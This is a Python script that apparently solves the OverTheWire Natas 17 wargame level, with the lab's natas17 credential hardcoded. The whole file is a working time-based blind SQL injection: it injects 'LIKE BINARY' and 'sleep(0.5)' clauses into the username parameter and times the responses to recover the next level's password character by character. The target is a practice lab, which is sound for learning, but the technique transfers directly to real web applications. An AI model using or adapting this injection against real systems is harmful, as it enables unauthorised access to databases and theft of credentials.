#!/bin/python
import requests
import string
from timeit import default_timer as timer

url = "http://natas17.natas.labs.overthewire.org"
auth_username = "natas17"
auth_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

# characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = ''.join([string.ascii_letters, string.digits])

# Begin by building a dictionary of characters found in the password
# This will greatly decrease the complexity for our brute force attempts
password_dictionary = []
exists_str = "This user exists."
for char in characters:
    uri = ''.join([url, '?', 'username=natas18"',
                  '+and+password+LIKE+BINARY+"%', char, '%"', 'and sleep(0.5) -- ', '&debug'])
    start = timer()
    r = requests.get(uri, auth=(auth_username, auth_password))
    end = timer()
    if end - start > 0.3:
        password_dictionary.append(char)
        print("Password Dictionary: {0}".format(''.join(password_dictionary)))
print("Dictionary build complete.")
print("Dictionary: {0}".format(''.join(password_dictionary)))

try_pw = ""
for i in range(65):
    in_len = len(try_pw)
    for char in password_dictionary:
        uri = ''.join([url, '?', 'username=natas18"',
                       '+and+password+LIKE+BINARY+"', try_pw, char, '%"', 'and sleep(0.5) -- ', '&debug'])
        start = timer()
        r = requests.get(uri, auth=(auth_username, auth_password))
        end = timer()
        if end - start > 0.3:
            try_pw += char
            print("Password: {0}".format(try_pw))
            break
    if (in_len == len(try_pw)):
        break

print("Hacking complete!")
print("Password: {0}".format(try_pw))
